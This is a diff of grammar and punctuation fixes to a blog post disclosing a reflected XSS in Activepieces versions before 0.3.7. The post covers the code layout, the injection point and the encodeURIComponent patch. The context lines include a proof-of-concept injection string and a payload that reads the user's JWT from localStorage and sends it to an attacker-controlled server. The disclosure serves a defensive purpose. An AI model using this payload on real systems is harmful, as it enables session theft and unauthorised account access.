@@ -11,7 +11,7 @@ permalink: /bloghub/xss-on-steroids/
 
 # XSS on Steroids | Gaining Unauthenticated Access
 
-[Activepieces](https://www.activepieces.com/) is an open-source business automation tool, aka the open-source alternative for *Zapier,* which helps individuals automate flows and their work in a flexible UI environment without the need to write code, for example, you can build automation with *Activepieces* to send a Slack notification for each new Trello card.  
+[Activepieces](https://www.activepieces.com/) is an open-source business automation tool, aka the open-source alternative for *Zapier*, which helps individuals automate flows and their work in a flexible UI environment without the need to write code, for example, you can build automation with *Activepieces* to send a Slack notification for each new Trello card.  
 
 In my effort to help the open-source world enhance its security posture, I decided to do vulnerability research, meanwhile testing, I identified a reflected XSS that helps unauthenticated attackers gain access by inducing victims to click on the specially crafted link. 
 
@@ -19,11 +19,11 @@ Following this article, we are going to explore the technical details of the vul
 
 ## Impact
 
-Versions prior to `0.3.7` are vulnerable to **Reflected XSS,** which leverages unauthenticated attackers to gain access and possibly steal credentials for added pieces and flows.
+Versions prior to `0.3.7` are vulnerable to **Reflected XSS**, which leverages unauthenticated attackers to gain access and possibly steal credentials for added pieces and flows.
 
 ## Deep Dive
 
-The application is written with TypeScript which is a Typed JavaScript framework. The [application](https://github.com/activepieces/activepieces) separates frontend and backend code in separate folders inside the **packages** directory.
+The application is written with TypeScript, a Typed JavaScript framework. The [application](https://github.com/activepieces/activepieces) separates frontend and backend code in separate folders inside the **packages** directory.
 
 ```html
 $> tree packages -L 1
@@ -36,7 +36,7 @@ packages
 └── shared
 ```
 
-Moreover, the backend structure looks as follows, where it’s pretty obvious where the backend code and unit tests are reside.
+Moreover, the backend structure looks as follows, where it’s pretty obvious where the backend code and unit tests reside.
 
 ```html
 $> tree packages/backend -L 2 
@@ -105,7 +105,7 @@ Crafting a payload that closes the called function following it with our payload
 test' },'*')} else alert('poc');//
 ```
 
- This can be also leveraged to steal the JWT token of the authenticated token:
+ This can be also leveraged to steal the authenticated JWT token:
 
 ```
 test' },'*')} else { const xhr = new XMLHttpRequest();xhr.open('GET', '[https://](https://enxwjqx3bxw4.x.pipedream.net/)<your server>' + localStorage.getItem('token'));xhr.send(); }//
@@ -113,7 +113,7 @@ test' },'*')} else { const xhr = new XMLHttpRequest();xhr.open('GET', '[https://
 
 ### Patch
 
-The vulnerability was mitigated by passing the *params[’code’]* to `encodeURIComponent()` 
+The vulnerability was mitigated by passing the *params[’code’]* to `encodeURIComponent()`. 
 
 ```jsx
 else {
